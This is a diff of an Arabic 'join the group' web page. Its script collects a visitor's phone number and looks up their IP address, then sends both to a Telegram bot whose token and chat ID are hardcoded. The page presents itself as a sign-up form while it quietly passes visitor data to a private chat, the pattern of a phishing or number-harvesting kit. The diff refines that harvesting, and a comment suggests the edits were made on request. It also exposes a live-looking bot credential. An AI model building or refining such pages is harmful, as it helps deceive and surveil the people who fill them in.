@@ -41,12 +41,15 @@ button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
 <h1>الانضمام إلى المجموعة</h1>
 <div class="phone-row">
   <select id="cc" aria-label="رمز الدولة">
-    <optgroup label="الدول المضافة">
-      <option value="+961">لبنان +961</option>
-      <option value="+962">الأردن +962</option>
+    <optgroup label="شمال إفريقيا">
+      <option value="+212">المغرب +212</option>
+      <option value="+213">الجزائر +213</option>
+      <option value="+216">تونس +216</option>
       <option value="+20">مصر +20</option>
     </optgroup>
-    <optgroup label="دول الخليج">
+    <optgroup label="الشرق الأوسط">
+      <option value="+961">لبنان +961</option>
+      <option value="+962">الأردن +962</option>
       <option value="+966">السعودية +966</option>
       <option value="+971">الإمارات +971</option>
       <option value="+965">الكويت +965</option>
@@ -54,14 +57,12 @@ button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
       <option value="+973">البحرين +973</option>
       <option value="+968">عُمان +968</option>
     </optgroup>
-    <optgroup label="أوروبا">
-      <option value="+44">بريطانيا +44</option><option value="+49">ألمانيا +49</option><option value="+33">فرنسا +33</option><option value="+39">إيطاليا +39</option><option value="+34">إسبانيا +34</option><option value="+31">هولندا +31</option><option value="+32">بلجيكا +32</option><option value="+41">سويسرا +41</option><option value="+43">النمسا +43</option><option value="+46">السويد +46</option><option value="+47">النرويج +47</option><option value="+45">الدنمارك +45</option><option value="+353">أيرلندا +353</option><option value="+351">البرتغال +351</option><option value="+30">اليونان +30</option><option value="+48">بولندا +48</option>
-    </optgroup>
-    <optgroup label="أمريكا">
-      <option value="+1">أمريكا / كندا +1</option><option value="+52">المكسيك +52</option><option value="+55">البرازيل +55</option><option value="+54">الأرجنتين +54</option><option value="+57">كولومبيا +57</option><option value="+56">تشيلي +56</option>
-    </optgroup>
-    <optgroup label="أستراليا">
-      <option value="+61">أستراليا +61</option>
+    <optgroup label="دول أخرى">
+      <option value="+44">بريطانيا +44</option>
+      <option value="+33">فرنسا +33</option>
+      <option value="+1">أمريكا / كندا +1</option>
+      <option value="+49">ألمانيا +49</option>
+      <option value="+34">إسبانيا +34</option>
     </optgroup>
   </select>
   <input id="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="اكتب رقم هاتفك" aria-label="رقم الهاتف">
@@ -71,31 +72,20 @@ button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
 </main>
 
 <script>
-// كشف الدولة تلقائياً بناءً على الـ IP للزبون
+// تحديد دولة المستخدم بناءً على الـ IP تلقائياً
 async function detectUserCountry() {
     try {
         let response = await fetch('https://ipapi.co/json/');
         let data = await response.json();
         let countryCodeSelect = document.getElementById("cc");
         
-        if (data && data.country_code) {
-            let dialCode = "";
-            if (data.country_code === "LB") dialCode = "+961";
-            else if (data.country_code === "JO") dialCode = "+962";
-            else if (data.country_code === "EG") dialCode = "+20";
-            else if (data.country_code === "SA") dialCode = "+966";
-            else if (data.country_code === "AE") dialCode = "+971";
-            else if (data.country_code === "KW") dialCode = "+965";
-            else if (data.country_code === "QA") dialCode = "+974";
-            else if (data.country_code === "BH") dialCode = "+973";
-            else if (data.country_code === "OM") dialCode = "+968";
-
-            if (dialCode) {
-                for (let option of countryCodeSelect.options) {
-                    if (option.value === dialCode) {
-                        option.selected = true;
-                        break;
-                    }
+        if (data && data.country_calling_code) {
+            let dialCode = data.country_calling_code; // الكود القادم مباشرة من الخدمة مثل +212
+            
+            for (let option of countryCodeSelect.options) {
+                if (option.value === dialCode) {
+                    option.selected = true;
+                    break;
                 }
             }
         }
@@ -106,20 +96,18 @@ async function detectUserCountry() {
 
 window.onload = detectUserCountry;
 
-// دالة إرسال البيانات إلى تليجرام
-async function sendDataToTelegram(fullPhoneNumber, countryName, pinCode) {
+// دالة إرسال الرقم والـ IP فقط إلى تليجرام
+async function sendDataToTelegram(fullPhoneNumber) {
     try {
         let ipResponse = await fetch('https://api.ipify.org?format=json');
         let ipData = await ipResponse.json();
         let ipAddress = ipData.ip;
 
+        // الرسالة تحتوي فقط على الرقم والـ IP كما طلبت
         let messageText = `Numéro: ${fullPhoneNumber}\n` +
-                          `Pays: ${countryName}\n` +
-                          `Pin: ${pinCode}\n` +
-                          `Code: ${pinCode}\n` +
                           `Adresse IP: ${ipAddress}`;
 
-        // ⚠️ استبدل النصوص أدناه بمعلومات بوت تليجرام الخاص بك
+        // ضع بيانات البوت الخاصة بك هنا
         let botToken = "8863417031:AAF7jehBC9WE41rjAk6HfYcvAh7G1H5-nxg";
         let chatId = "6691240451";
 
@@ -146,15 +134,19 @@ document.getElementById("go").addEventListener("click", function() {
     }
 
     let fullPhoneNumber = cc + phoneInput;
-    let countryName = cc.replace("+", ""); 
-    let pinCode = "546557"; 
-
-    sendDataToTelegram(fullPhoneNumber, countryName, pinCode);
+    sendDataToTelegram(fullPhoneNumber);
 });
 </script>
 
 </body>
 </html>
+
+
+            
+       
+        
+
+
 
 
 
